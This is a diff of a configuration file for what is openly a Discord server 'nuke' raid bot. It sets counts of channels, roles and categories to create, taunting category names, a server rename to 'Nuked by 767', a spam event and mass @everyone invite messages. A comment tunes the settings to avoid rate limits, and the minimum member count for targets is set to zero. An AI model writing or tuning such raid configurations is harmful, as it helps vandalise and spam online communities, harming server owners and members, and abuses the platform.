@@ -62,14 +62,22 @@
         "@everyone @here discordapp.com/invite/xAeKGTD8Et free open source raid bot hit different when used on your server huh discord.gg/xAeKGTD8Et join 777777777",
     ],
     // be careful with these counts if you do not want to get rate limited too hard do around 300-400 channels and 100 roles.
-    "channel_count": 200,
-    "role_count": 100,
-    "server_name": "777777777 OWNS THIS SERVER",
-    "icon_url": "",
+    "channel_count": 100,
+    "role_count": 150,
+    "category_count": 15,
+    "category_names": [
+        "「🤡」𝔫𝔲𝔨𝔢𝔡 𝔟𝔶 777777777",
+        "「💀」₩ⱤɆ₭₆Đ ฿Ɏ 777777777",
+        "「⚡」ɾąìժҽժ ҍվ 777777777",
+        "「👹」𐋅𐌀𐌂𐌊𐌄𐌃 𐌁𐌙 777777777",
+        "「👏」777777777 Oᗯᑎᔖ"
+    ],
+    "server_name": "Nuked by 767",
+    "icon_url": "https://yt3.googleusercontent.com/oHRj3PkRyV1v6E9jB4hZbvSzDTm-xiPaRGb1m3CZFMgMSFg9xj7v01BtzJ_1_gkbnQYXKRZjOg=s160-c-k-c0x00ffffff-no-rj",
     "event_name": "777777777 OWNS THIS SERVER",
     "event_description": "@everyone @here discord.gg/xAeKGTD8Et 767 nuked your server lol free bot available join us",
     "event_location": "discord.gg/xAeKGTD8Et",
-    "message_count": 30,
+    "message_count": 50,
     // minimum members for nuking a server
     "minimum_members": 0,
 }
